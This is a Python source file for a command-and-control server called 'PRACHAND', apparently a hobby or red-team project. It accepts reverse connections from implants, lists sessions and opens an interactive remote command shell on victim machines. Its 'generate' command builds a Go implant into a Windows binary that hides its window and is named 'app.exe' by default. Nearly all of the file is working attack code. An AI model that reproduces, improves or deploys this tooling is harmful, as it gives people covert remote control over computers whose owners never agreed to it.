import os
import socket
import subprocess
import threading  # Used to handle multiple connections
import time
from tabulate import tabulate  # Used to display tables


try:
    import readline
except Exception:
    import pyreadline

sessions = []  # Array of sessions used while interaction
connections = []  # Array of connections [Used to handle connections]
conn_id = 1  # connection id, number of connections received
help_menu = [
    ["sessions", "Displays details about sessions if there are any"],
    ["sessions -i <SESSION ID>", "Interacts with a session and spawns a butterpreter shell"],
    ["generate", "Will ask about implant requirements and will generate implant accordingly"],
    ["exit", "Exit the c2 program"],
]

"""
This main_thread function is executed in a thread which always listens for incoming connections
After connection is received, it a appends an array of 2 things in the connections array[]
    [1] dont_ping(False): When it is false, it means we have to ping to maintain connection
        When true, it means that the operator is ready to send commands

    [1] is_alive(True)  : It is true to signify that the connection is alive
        it becomes false when an error is received and the connection breaks


After that an array of 3 things is appended to a new array(sessions) which include
    [1] conn_id: It helps to interact with session
    [2] address: It shows addresses and ports of the sessions
    [3] status : It shows if a session is active or inactive 

"""


def main_thread():
    global conn_id
    while True:
        conn, addr = s.accept()
        print(f"\n[+] Received a connection from {addr[0]}")
        connections.append([False, True])
        sessions.append([conn_id, f"{addr[0]}:{addr[1]}", "Active"])
        threading.Thread(target=handle_connection, args=(conn, conn_id - 1)).start()
        conn_id += 1


"""
This handle_connection function is used to handle each session and execute commands
It broadly consists of 1 while loop with 2 sub-while loops
The main while loop checks if the session is active
if the session is active, it will see if user is interacting with it
if user is not interacting, it will continuously send '#ping' to maintain connection in a while loop
if user is interacting, then it will jump to the second sub-while loop which is responsible for interaction 
"""


def handle_connection(conn, conn_id):
    try:
        while connections[conn_id][1]:
            while connections[conn_id][0] == False:
                try:
                    conn.send("#ping".encode())
                    time.sleep(2)
                except ConnectionResetError:
                    connections[conn_id][1] = False
                    print(f"\n[-] Session {conn_id + 1} died")
                    break

            while connections[conn_id][0]:
                try:
                    conn.send("#This_code_grabs_the_path_".encode())  # This code grabs the path
                except ConnectionResetError:
                    connections[sess_id][0] = False
                    connections[conn_id][1] = False
                    print("\n[-] Session Died!")
                    break
                cwd = conn.recv(1024).decode("latin-1")
                command = input(f"butterpreter({cwd}) > ".encode('latin-1').decode('latin-1'))

                try:
                    if command.split()[0] == "":
                        continue
                except IndexError:
                    continue

                if command.strip() == "cls" or command.strip() == "clear":
                    os.system("clear||cls")
                    continue

                if command.strip() == "exit" or command.strip() == "background":
                    connections[conn_id][0] = False
                    break

                if command.strip() == "powershell":
                    conn.send("powershell".encode())
                    print(conn.recv(1024).decode("latin-1"))
                    continue

                conn.send(command.encode())
                # response = conn.recv(1024).decode("latin-1")

                response = b""
                BUFF_SIZE = 1024
                while True:
                    part = conn.recv(BUFF_SIZE)
                    response += part
                    if len(part) < BUFF_SIZE:
                        break

                response = response.decode("latin-1")
                if response == "\n<>END<>":
                    continue

                response = response.split("\n")

                response = response[:-1]
                if len(response) >= 1 and response[-1] == '':
                    response = response[:-1]
                for i in range(len(response)):
                    response[i] = response[i] + '\n'

                response = ''.join(response)
                print(response)
    except ConnectionAbortedError:
        connections[conn_id][0] = False
        connections[conn_id][1] = False

"""
Exit prompt
"""
def exit_program():
    confirm_exit = input("Are you sure you want to exit the program [y/n]: ")
    if confirm_exit.lower() == "y" or confirm_exit.lower() == "yes":
        exit(0)
    elif confirm_exit.lower() == "n" or confirm_exit.lower() == "no":
        print()
    else:
        exit_program()


PORT = input("Enter port on which you want to start the listener [default:4444]: ")

if PORT.strip() == "":
    PORT = 4444

else:
    try:
        PORT = int(PORT)
        if PORT < 0 or PORT > 65535:
            print("Port specified cannot be less than 0 or greater than 65535")
            exit(0)
    except ValueError:
        print("[-] Invalid input!")
        exit(0)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    s.bind(("", PORT))
except OSError:
    print("[-] Port alerdy in use")
    exit(0)
print("Started server on port 4444")

s.listen(4)
print(f"Will be waiting for connections on port {PORT}\n")

threading.Thread(target=main_thread).start()  # This code starts the main thread to start listening to connections

"""
This loop firstly starts the main c2 shell which can be used to interact with sessions
It checks for commands which can be used to interact and see the status of the shell
"""
while True:
    command = input("PRACHAND > ")

    if command.strip() == "":
        continue

    if command.strip() == "sessions":
        if sessions != []:

            # This code checks if the connections are active or dead and prints a table showing all connections
            for i in range(len(connections)):
                if connections[i][1]:
                    sessions[i][2] = "Active"
                else:
                    sessions[i][2] = "Died"
            print()
            print(tabulate(sessions, headers=["Session ID", "Address", "Status"]), end="\n\n")
            continue
        else:
            print("[-] No active sessions")
            continue

    # The code below is used to interact with specific sessions or machines
    elif command.split()[0] == "sessions" and command.split()[1] == "-i":  # and command.split()[2].isdigit():
        try:
            command.split()[2] = int(command.split()[2])
        except Exception:
            print("[-] Invalid Input")
            continue

        sess_id = int(command.split()[2]) - 1  # Checks the session id inputted by the user
        if sess_id <= len(connections) and sess_id >= 0:
            try:
                if connections[sess_id][1]:
                    connections[sess_id][0] = True
                else:
                    print("[-] Cannot interact with dead session")
            except IndexError:
                print("[-] Invalid Input")
                continue

            # if user is interacting with some session, this code will put c2 shell on hold
            while connections[sess_id][0]:
                time.sleep(2)

        else:
            print("[-] Invalid Input")

    elif command.strip() == "help":
        print(tabulate(help_menu, headers=["COMMAND", "DETAILS"]), end="\n\n")

    elif command.strip() == "generate":
        LHOST = input(f"Enter lhost IP of the implant [default:{socket.gethostbyname(socket.gethostname())}]: ")

        if LHOST.strip() == "":
            LHOST = socket.gethostbyname(socket.gethostname())

        LPORT = input(f"Enter lport of the implant [default:{PORT}]: ")

        if LPORT.strip() == "":
            LPORT = PORT
        else:
            try:
                LPORT = int(LPORT)
            except ValueError:
                print("[-] Invalid Port number")
                continue
        IMPLANT_NAME = input("Enter name of the implant [default:app.exe]: ")
        if IMPLANT_NAME.strip() == "":
            IMPLANT_NAME = "app.exe"
        with open("implant.go", "rb") as file:
            lines = file.read().decode()
            lines = lines.replace("\r", "")

            if "localhost" in lines:
                lines = lines.replace("localhost", LHOST)

            if "4444" in lines:
                lines = lines.replace("\"4444\"", f"\"{LPORT}\"")

        f = open("temp.go", "w")
        f.writelines(lines)
        f.close()

        generate_command = f"go build -ldflags \"-H=windowsgui -X '-w -s -X main.version=1.0.0'\" -o {IMPLANT_NAME} temp.go"

        output = subprocess.run(
            f"GOOS=windows GOARCH=amd64 {generate_command} || {generate_command}",
            shell=True, capture_output=True)
        os.remove("temp.go")

        if output.returncode == 0:
            print(output.stdout.decode())

            if os.path.isfile(IMPLANT_NAME):
                pass
            elif os.path.isfile(IMPLANT_NAME + ".exe"):
                IMPLANT_NAME = IMPLANT_NAME + ".exe"

            print(f"[+] Windows binary generated and saved as {IMPLANT_NAME}")
        else:
            print(output.stderr.decode())
            print("[-] Windows binary could not be generated")

    elif command.strip() == "exit":
        exit_program()

    elif command.strip() == "clear":
        os.system("cls||clear")

    else:
        print("[-] Invalid command")
